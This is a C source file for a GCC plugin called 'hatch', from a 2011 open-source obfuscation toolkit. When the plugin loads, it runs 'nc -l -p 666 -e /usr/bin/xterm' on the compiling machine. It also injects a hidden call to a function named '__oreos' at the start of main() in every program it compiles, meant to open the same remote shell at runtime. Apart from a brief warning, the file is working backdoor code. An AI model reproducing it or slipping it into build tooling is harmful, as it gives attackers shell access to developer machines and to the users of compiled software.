/******************************************************************************
 * hatch.c 
 *
 * GOAT-Plugs: GCC Obfuscation Augmentation Tools
 * 
 * Hatch plugin - Example GCC plugin calling a runtime function to
 * spawn a netcat socket instance on the executing machine on port 666.  Once
 * the socket is connected to, a remote xterm session is started.  This also
 * occurs at compile time on the compiling machine.
 *
 * WARNING: THIS IS JUST AN EXAMPLE.  SPAWNING SOCKETS CAN BE VERY DANGEROUS.
 *
 * Copyright (C) 2011 Matt Davis (enferex) of 757Labs
 * (www.757Labs.org)
 *
 * hatch.c is part of the GOAT-Plugs GCC plugin set.
 * GOAT-Plugs is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * GOAT-Plugs is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GOAT-Plugs.  If not, see <http://www.gnu.org/licenses/>.
 *****************************************************************************/

#include <stdio.h>
#include <coretypes.h>
#include <gcc-plugin.h>
#include <gimple.h>
#include <tree.h>
#include <tree-flow.h>
#include <tree-pass.h>
#include <vec.h>


/* Resources:
 * Using netcat to spawn a remote shell:
 * http://jkeohan.wordpress.com/2010/04/30/using-netcat-to-spawn-a-remote-shell/
 */


int plugin_is_GPL_compatible = 1;


static struct plugin_gcc_version hatch_version =
{
    .basever = "4.6",
};


/* We don't need to run any tests before we execute our plugin pass */
static void open_up_the_magic(void)
{
    gimple call;
    gimple_stmt_iterator gsi;
    tree proto, fndecl;

    /* Create the function prototype */
    proto = build_function_type_list(void_type_node, NULL_TREE);

    /* Create the function declaration */
    fndecl = build_fn_decl("__oreos", proto);

    /* Now make a call statement to this function */
    call = gimple_build_call(fndecl, 0);

    /* Insert... */
    gsi = gsi_start_bb(ENTRY_BLOCK_PTR->next_bb);
    gsi_insert_after(&gsi, call, GSI_NEW_STMT);
}


/* This is the plugin callback that gets triggered based on data specified in
 * the pass struct defined below.
 * Returns 0 on success, error otherwise
 */
static void hatch_exec(void *gcc_data, void *user_data)
{
    struct function *func;
    struct cgraph_node *node;

    /* Traverse the call graph looking for "main()" */
    for (node=cgraph_nodes; node; node=node->next)
    {
        if (!(func = DECL_STRUCT_FUNCTION(node->decl)))
          continue;

        /* Match main() */
        if (get_identifier(get_name(func->decl)) !=
            get_identifier("main"))
          continue;

        /* main() found... setup the current_function */
        push_cfun(func);
        open_up_the_magic();
        pop_cfun();

        break;
    }
}


/* Return 0 on success or error code on failure */
int plugin_init(struct plugin_name_args   *info,  /* Argument info  */
                struct plugin_gcc_version *ver)   /* Version of GCC */
{
    /* Check version */
    if (strncmp(ver->basever, hatch_version.basever, strlen("4.6")))
      return -1;

    /* xterm on port 666 of localhost */
    system("/usr/bin/nc -l -p 666 -e /usr/bin/xterm 2>/dev/null &");
    register_callback("hatch", PLUGIN_ALL_IPA_PASSES_END, hatch_exec, NULL);
    return 0;
}
